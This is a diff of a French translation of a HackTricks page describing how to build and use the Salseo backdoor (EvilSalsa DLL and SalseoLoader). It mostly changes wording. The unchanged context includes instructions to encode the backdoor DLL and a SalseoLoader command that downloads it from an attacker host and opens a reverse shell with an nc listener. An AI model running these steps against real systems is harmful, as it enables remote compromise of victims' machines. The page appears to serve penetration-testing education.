@@ -8,13 +8,13 @@ Autres moyens de soutenir HackTricks :
 
 * Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
 * Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
+* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
 * **Partagez vos astuces de piratage en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-## Compiler les binaires
+## Compilation des binaires
 
 Téléchargez le code source depuis github et compilez **EvilSalsa** et **SalseoLoader**. Vous aurez besoin de **Visual Studio** installé pour compiler le code.
 
@@ -22,7 +22,7 @@ Compilez ces projets pour l'architecture de la machine Windows où vous allez le
 
 Vous pouvez **sélectionner l'architecture** dans Visual Studio dans l'onglet **"Build"** à gauche, dans **"Platform Target".**
 
-(**Si vous ne trouvez pas ces options, appuyez sur l'onglet "Project"** puis sur **"\<Nom du Projet> Properties"**)
+(**Si vous ne trouvez pas ces options, cliquez sur l'onglet "Project"** puis sur **"\<Nom du Projet> Properties"**)
 
 ![](<../.gitbook/assets/image (132).png>)
 
@@ -30,7 +30,7 @@ Ensuite, construisez les deux projets (Build -> Build Solution) (Le chemin de l'
 
 ![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)
 
-## Préparer la Porte Dérobée
+## Préparation du Backdoor
 
 Tout d'abord, vous devrez encoder le **EvilSalsa.dll.** Pour cela, vous pouvez utiliser le script python **encrypterassembly.py** ou vous pouvez compiler le projet **EncrypterAssembly** :
 
@@ -56,7 +56,7 @@ N'oubliez pas de démarrer un nc comme écouteur de shell inverse et un serveur 
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
-### **Obtention d'un reverse shell UDP (téléchargement d'une dll encodée via SMB)**
+### **Obtenir un reverse shell UDP (téléchargement de dll encodée via SMB)**
 
 N'oubliez pas de démarrer un nc en tant qu'écouteur de reverse shell, et un serveur SMB pour servir le evilsalsa encodé (impacket-smbserver).
 ```
@@ -87,19 +87,19 @@ Ouvrez le projet SalseoLoader en utilisant Visual Studio.
 
 ### Ajoutez avant la fonction principale : \[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 ### Installez DllExport pour ce projet
 
 #### **Outils** --> **Gestionnaire de Packages NuGet** --> **Gérer les Packages NuGet pour la Solution...**
 
-![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 #### **Recherchez le package DllExport (en utilisant l'onglet Parcourir), et appuyez sur Installer (et acceptez la popup)**
 
-![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-Dans votre dossier de projet, les fichiers suivants sont apparus : **DllExport.bat** et **DllExport\_Configure.bat**
+Dans votre dossier de projet sont apparus les fichiers : **DllExport.bat** et **DllExport\_Configure.bat**
 
 ### **D**ésinstallez DllExport
 
@@ -133,7 +133,7 @@ Sélectionnez la **plateforme x64** (Projet --> Propriétés de SalseoLoader -->
 
 ![](<../.gitbook/assets/image (9) (1) (1).png>)
 
-Pour **construire** la solution : Construire --> Construire la Solution (Dans la console de sortie, le chemin de la nouvelle DLL apparaîtra)
+Pour **construire** la solution : Construire --> Construire la Solution (Dans la console de sortie le chemin de la nouvelle DLL apparaîtra)
 
 ### Testez la Dll générée
 
@@ -147,7 +147,7 @@ Si aucune erreur n'apparaît, vous avez probablement une DLL fonctionnelle !!
 
 ## Obtenir un shell à l'aide de la DLL
 
-N'oubliez pas d'utiliser un **serveur HTTP** et de configurer un **écouteur nc**
+N'oubliez pas d'utiliser un **serveur HTTP** et de configurer un **listener nc**
 
 ### Powershell
 ```
